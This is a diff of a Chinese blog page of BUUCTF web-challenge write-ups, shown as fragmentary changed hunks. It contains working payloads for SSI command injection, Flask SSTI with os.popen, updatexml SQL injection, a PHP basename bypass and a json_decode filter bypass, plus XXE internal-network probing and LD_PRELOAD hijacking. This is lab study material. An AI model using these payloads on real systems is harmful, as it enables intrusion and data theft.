+<p>（shtml是一种基于SSI技术的文件。SSI 注入全称Server-Side Includes Injection，即服务端包含注入。SSI 是类似于 CGI，用于动态页面的指令。SSI 注入允许远程在 Web 应用中注入脚本来执行代码。SSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。从技术角度上来说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。IIS和Apache都可以开启SSI功能）</p>
+<p>（SSI注入的条件：</p>
+<p>1.Web 服务器已支持SSI（服务器端包含）</p>
+<p>2.Web 应用程序未对对相关SSI关键字做过滤</p>
+<p>3.Web 应用程序在返回响应的HTML页面时，嵌入用户输入）</p>
 <p>模板就类似于</p>
-<!--#exec cmd="文件名称"-->
-
+<p><code>&lt;!--#exec cmd=&quot;文件名称&quot;--&gt;</code></p>
 <p>可以先用ls查看目录找到flag文件，再利用cat查看</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907204923959.png" alt="image-20210907204923959"></p>
 <p>访问页面找到flag</p>
@@ -2449,12 +2482,13 @@ echo $result;
 ?&gt;</code></pre>
 
 <p>但是从这个源码里也找不到flag</p>
-<p>后边就是我看不懂的操作了</p>
+<p>还有一个知识xxe可以内网探测存活的主机，获取/etc/hosts文件，我们分别读取关键文件：**/etc/hosts 和 /proc/net/arp**</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210909210613519.png" alt="image-20210909210613519"></p>
 <p>访问proc/net/arp文件查看有无可利用内网主机</p>
 <p>尝试访问一下这个ip，报错</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210909211003923.png" alt="image-20210909211003923"></p>
 <p>之后c段扫描，找到flag</p>
+<p><strong>总的来说，主机上面没有flag，需要去看hosts文件看看内网的主机是否有flag</strong></p>
 <h2 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h2><p>这题感觉有点问题</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210912153230545.png" alt="image-20210912153230545"></p>
 <p>写脚本找lv6</p>
@@ -2599,7 +2633,7 @@ else&#123;
 <p>但是</p>
 <p>disable_functions禁用的函数太多导致shell不能执行命令</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918184324855.png" alt="image-20210918184324855"></p>
-<p>这里可以用蚁剑的插件（蚁剑yyds</p>
+<p>这里可以用蚁剑的插件</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918184419549.png" alt="image-20210918184419549"></p>
 <p>还有一种方法</p>
 <p>利用linux提供的LD_preload环境变量，劫持共享so，在启动子进程的时候，新的子进程会加载我们恶意的so拓展，然后我们可以在so里面定义同名函数，即可劫持API调用，成功RCE<br>参考链接：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/175403">https://www.anquanke.com/post/id/175403</a></p>
@@ -2707,8 +2741,8 @@ show_source(&quot;check.php&quot;);</code></pre>
 
 <p>知道前几位了</p>
 <p>根据生成算法逆向出满足php_mt_seed工具要求的参数（百度抄的</p>
-<pre class="language-none"><code class="language-none">str1&#x3D;&#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;
-str2&#x3D;&#39;ENxxxZwNwR&#39;
+<pre class="language-php" data-language="php"><code class="language-php">str1&#x3D;&#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;
+str2&#x3D;&#39;pbEzqyRCJP&#39;
 str3 &#x3D; str1[::-1]
 length &#x3D; len(str2)
 res&#x3D;&#39;&#39;
@@ -2718,9 +2752,8 @@ for i in range(len(str2)):
             res+&#x3D;str(j)+&#39; &#39;+str(j)+&#39; &#39;+&#39;0&#39;+&#39; &#39;+str(len(str1)-1)+&#39; &#39;
             break
 print(res)
-</code></pre>
+#15 15 0 61 1 1 0 61 40 40 0 61 25 25 0 61 16 16 0 61 24 24 0 61 53 53 0 61 38 38 0 61 45 45 0 61 51 51 0 61 </code></pre>
 
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210921134815768.png" alt="image-20210921134815768"></p>
 <p>放到php_mt_seed里跑种子</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210921134854213.png" alt="image-20210921134854213"></p>
 <p>再利用这个脚本得到最后的值</p>
@@ -2789,7 +2822,7 @@ if (isset($_POST[&#39;guess&#39;])) &#123;
 <pre class="language-none"><code class="language-none">php -r &#39;print(basename(&quot;index.php&#x2F;config.php&#x2F;\x80&quot;));&#39; &#x2F;&#x2F; config.php
 php -r &#39;print(basename(&quot;\x80index.php&#x2F;config.php&quot;));&#39; &#x2F;&#x2F; config.php</code></pre>
 
-<p><strong>$_SERVER[‘PHP_SELF’]表示当前执行脚本的文件名，当使用了PATH_INFO时，这个值是可控的。所以可以尝试用/index.php/config.php?source来读取flag。</strong></p>
+<p><strong>$_SERVER[‘PHP_SELF’]表示当前执行脚本的文件名，当使用了PATH_INFO时，这个值是可控的。所以可以尝试用/index.php/config.php/\x80?source来读取flag。</strong></p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211021163516849.png" alt="image-20211021163516849"></p>
 <h2 id="CISCN2019-总决赛-Day2-Web1-Easyweb"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 总决赛 Day2 Web1]Easyweb"></a>[CISCN2019 总决赛 Day2 Web1]Easyweb</h2><p>源码泄露</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211021165221385.png" alt="image-20211021165221385"></p>
@@ -2910,12 +2943,11 @@ if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211027000543438.png" alt="image-20211027000543438"></p>
 <h2 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h2><p>一眼ssti，然后就不会了（</p>
 <p>f12看到源码注释，get方式，参数为search</p>
-<p>试一下传49确定是ssti</p>
+<p>试一下传<code>&#123;&#123;7*7&#125;&#125;</code>确定是ssti</p>
 <pre class="language-none"><code class="language-none">config 也是 Flask模版中的一个全局对象,它包含了所有应用程序的配置值。
 &#123;&#123; config.items() &#125;&#125;    &#x2F;&#x2F; 查看配置项目的信息  </code></pre>
 
-
-
+<p><code>&#123;&#123;(()|select|string)[24]~(()|select|string)[24]~(()|select|string)[15]~(()|select|string)[20]~(()|select|string)[6]~(()|select|string)[18]~(()|select|string)[18]~(()|select|string)[24]~(()|select|string)[24]&#125;&#125; </code></p>
 <p>例一：<br>warnings.catch_warnings类</p>
 <pre class="language-none"><code class="language-none">&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;)&#125;&#125;</code></pre>
 
@@ -2959,7 +2991,8 @@ if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211028171620967.png" alt="image-20211028171620967"></p>
 <p>还是没输出全</p>
 <p>之后就要用逆序输出了</p>
-<p>ethe&quot;||updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;)))),1)#</p>
+<pre class="language-txt" data-language="txt"><code class="language-txt">ethe&quot;||updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;)))),1)#</code></pre>
+
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211028171750860.png" alt="image-20211028171750860"></p>
 <h2 id="HITCON-2017-SSRFme"><a href="#HITCON-2017-SSRFme" class="headerlink" title="[HITCON 2017]SSRFme"></a>[HITCON 2017]SSRFme</h2><p>进去后是php代码</p>
 <p>直接抄的其他师傅的注释</p>
@@ -3012,30 +3045,29 @@ perl函数看到要打开的文件名中如果以管道符（键盘上那个竖�
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211115002808993.png" alt="image-20211115002808993"></p>
 <p>还可以直接get参数进去</p>
 <p>但是cat参数没法直接用，还有过滤，不过可以用换行符绕过过滤</p>
-<pre><code>&lt;?php
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
 
-putenv(&#39;PATH=/home/rceservice/jail&#39;);
+putenv(&#39;PATH&#x3D;&#x2F;home&#x2F;rceservice&#x2F;jail&#39;);
 设置了环境变量的PATH，导致不能使用相对路径，只能用绝对路径：
 if (isset($_REQUEST[&#39;cmd&#39;])) &#123;
-    $json = $_REQUEST[&#39;cmd&#39;];
+    $json &#x3D; $_REQUEST[&#39;cmd&#39;];
 if (!is_string($json)) &#123;
-    echo &#39;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#39;;
-&#125; elseif (preg_match(&#39;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#39;, $json)) &#123;
-    echo &#39;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#39;;
+    echo &#39;Hacking attempt detected&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&#39;;
+&#125; elseif (preg_match(&#39;&#x2F;^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\&#x2F;;-@\[-&#96;|~\x7F]+).*$&#x2F;&#39;, $json)) &#123;
+    echo &#39;Hacking attempt detected&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&#39;;
 &#125; else &#123;
-    echo &#39;Attempting to run command:&lt;br/&gt;&#39;;
-    $cmd = json_decode($json, true)[&#39;cmd&#39;];
-    if ($cmd !== NULL) &#123;
+    echo &#39;Attempting to run command:&lt;br&#x2F;&gt;&#39;;
+    $cmd &#x3D; json_decode($json, true)[&#39;cmd&#39;];
+    if ($cmd !&#x3D;&#x3D; NULL) &#123;
         system($cmd);
     &#125; else &#123;
         echo &#39;Invalid input&#39;;
     &#125;
-    echo &#39;&lt;br/&gt;&lt;br/&gt;&#39;;
+    echo &#39;&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&#39;;
 &#125;
 &#125;
-?&gt;
-</code></pre>
-<p>cat命令不能用，原因可能是当前的PATH下没有cat，这里需要也需要用绝对路径：</p>
+?&gt;</code></pre>
+<p>cat命令不能直接用，原因可能是当前的PATH下没有cat，这里需要也需要用绝对路径：</p>
 <blockquote>
 <p><a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?from=pc_blog_highlight&q=Linux">Linux</a>命令的位置：/bin,/usr/bin，默认都是全体用户使用，/sbin,/usr/sbin,默认root用户使用</p>
 </blockquote>
@@ -3821,6 +3853,7 @@ if (is_valid($body) &amp;&amp; isset($json) &amp;&amp; isset($json[&#39;page&#39
 $content &#x3D; preg_replace(&#39;&#x2F;HarekazeCTF\&#123;.+\&#125;&#x2F;i&#39;, &#39;HarekazeCTF&#123;&lt;censored&gt;&#125;&#39;, $content);#如果查到content里有相关的ctf字样，则用censored替代
 echo json_encode([&#39;content&#39; &#x3D;&gt; $content]);#最后将json编码后的content输出</code></pre>
 
+<p>这里可以利用json_decode会将<code>\uxxx</code>进行转义的特性，这样就可以绕过is_valid的检测</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211129200455993.png" alt="image-20211129200455993"></p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211129200943757.png" alt="image-20211129200943757"></p>
 <h2 id="WUSTCTF2020-CV-Maker"><a href="#WUSTCTF2020-CV-Maker" class="headerlink" title="[WUSTCTF2020]CV Maker"></a>[WUSTCTF2020]CV Maker</h2><p>进去后是个看起来很高端的界面，但是注册然后登录后有个明显 的上传位置</p>
@@ -4595,7 +4628,6 @@ if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) &#123;
 <p>我们看到，open()方法调用了file_exists()和is_dir()函数（注意name方法里的basename函数不算），size()方法调用了filesize()函数，delete()方法调用了unlink()函数，close()方法file_get_contents()函数。</p>
 <p>我们前面提到了，本题要读取/flag.txt文件，故刚刚列举的这些函数中，虽然文件操作函数不少，可以用来触发反序列化，对读取文件有用的只有close()方法中的file_get_contents()函数这一个，所以我们可以对它分析，</p>
 <p>这个时候，如果想不到__call()方法和__destruct()方法，基本上就可以放弃了，在phar题目里，魔术方法一般来讲是必须要用的，</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/18851076-8640cc264961f33a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/799/format/webp" alt="img"></p>
 <p>这里我们看到，FileList的__call()方法语义简单，就是遍历files数组，对每一个file变量执行一次$func，然后将结果存进$results数组，</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220206173648992.png" alt="image-20220206173648992"></p>
 <p>接下来的__destruct函数会将FileList对象的funcs变量和results数组中的内容以HTML表格的形式输出在index.php上（我们可以看到，index.php里创建了一个FileList对象，在脚本执行完毕后触发__destruct，则会输出该用户目录下的文件信息），</p>
@@ -4632,8 +4664,8 @@ if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) &#123;
 
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211210220146818.png" alt="image-20211210220146818"></p>
 <p>参考文章</p>
-<p>[<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/5b91e0b7f3ac">CISCN2019 华北赛区 Day1 Web1]Dropbox之愚见 - 简书 (jianshu.com)</a></p>
-<p>[(24条消息) 关于phar反序列化——BUUCTF-<a target="_blank" rel="noopener" href="https://blog.csdn.net/silence1_/article/details/102683254">CISCN2019 华北赛区 Day1 Web1]Dropbox_silence1_的博客-CSDN博客_buuctf 反序列化</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/5b91e0b7f3ac">CISCN2019 华北赛区 Day1 Web1]Dropbox之愚见 - 简书 (jianshu.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/silence1_/article/details/102683254">CISCN2019 华北赛区 Day1 Web1]Dropbox_silence1_的博客-CSDN博客_buuctf 反序列化</a></p>
 
                 
             </div>
@@ -5431,7 +5463,7 @@ $(function () {
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">149.6k</span>
+                        class="white-color">159.9k</span>
             
             
             
